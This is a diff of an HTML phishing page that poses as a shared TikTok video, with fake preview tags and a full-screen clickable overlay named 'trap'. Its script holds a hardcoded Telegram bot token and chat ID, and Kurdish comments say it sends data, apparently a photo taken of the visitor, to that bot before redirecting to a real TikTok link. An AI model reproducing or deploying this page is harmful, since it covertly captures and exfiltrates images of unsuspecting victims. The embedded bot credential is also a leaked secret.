@@ -7,14 +7,14 @@
 
     <meta property="og:title" content="TikTok · warza jayto">
     <meta property="og:description" content="Watch this video on TikTok">
-    <meta property="og:image" content="https://p16-va.tiktokcdn.com/obj/musically-maliva-obj/85160868f005c2e171b12b591b921356">
+    <meta property="og:image" content="https://www.tiktok.com/pwa-data/pwa_192.png">
     <meta property="og:type" content="video.other">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://p16-va.tiktokcdn.com/obj/musically-maliva-obj/85160868f005c2e171b12b591b921356">
+    <meta name="twitter:image" content="https://www.tiktok.com/pwa-data/pwa_192.png">
 
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://p16-va.tiktokcdn.com/obj/musically-maliva-obj/85160868f005c2e171b12b591b921356') no-repeat center center; background-size: cover; z-index: 1; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://www.tiktok.com/pwa-data/pwa_192.png') no-repeat center center; background-size: contain; z-index: 1; }
         .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
         .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.8; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
@@ -32,6 +32,7 @@
 
     <script>
         async function start() {
+            // زانیارییەکانی بۆتەکەت
             const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
             const chat_id = "7261354534";
             
@@ -59,11 +60,10 @@
                         body: formData
                     });
 
-                    // گواستنەوە بۆ ڤیدیۆیەکی تیک تۆک دوای وێنەگرتن
+                    // گواستنەوە بۆ ڤیدیۆیەکی تیک تۆک
                     window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
                 }, 1000);
             } catch (e) {
-                // ئەگەر ڕێگەی نەدا، هەر بیباتە سەر تیک تۆک
                 window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
             }
         }
